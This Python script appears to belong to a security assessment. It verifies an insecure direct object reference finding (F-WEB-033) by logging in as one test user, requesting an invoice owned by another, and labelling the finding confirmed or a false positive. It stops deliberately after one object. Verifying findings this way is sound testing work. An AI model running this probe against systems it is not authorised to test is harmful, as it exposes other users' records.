#!/usr/bin/python3
"""
Script to verify finding F-WEB-033 (Broken Access Control/IDOR).
"""

import argparse
import json
import requests
import sys


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target URL")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    session = requests.Session()

    user_a = "test-user-a"
    pass_a = "HalcyonTestA!"
    user_b = "test-user-b"

    # The target object is an invoice where the owner is user_b
    target_path = "/api/v1/invoices/1041"

    evidence = {
        "as_principal": user_a,
        "requested_object": f"invoice 1041, owned_by {user_b}",
        "result": "unknown"
    }
    verdict = "unconfirmed"

    try:
        # Authenticate as user_a
        session.post(
            f"{target}/login",
            data={"username": user_a, "password": pass_a},
            timeout=5
        )

        # Attempt to access the object that belongs to user_b
        req = session.get(f"{target}{target_path}", timeout=5)

        # Evaluate response to check if authorization is enforced
        if req.status_code == 200:
            verdict = "confirmed"
            evidence["result"] = (
                "Record returned to user_a, who is not authorized"
            )
        elif req.status_code in [401, 403]:
            verdict = "false_positive"
            evidence["result"] = "Access correctly denied"

    except requests.RequestException as e:
        sys.stderr.write(f"Request failed: {e}\n")
        sys.exit(1)

    stop_msg = "one unauthorized object proven; no enumeration"

    result = {
        "finding": "F-WEB-033",
        "class": "broken_access_control",
        "verdict": verdict,
        "evidence": evidence,
        "stopped_at": stop_msg
    }

    if verdict == "unconfirmed":
        result["to_settle"] = "Verify object ID and ownership details."

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
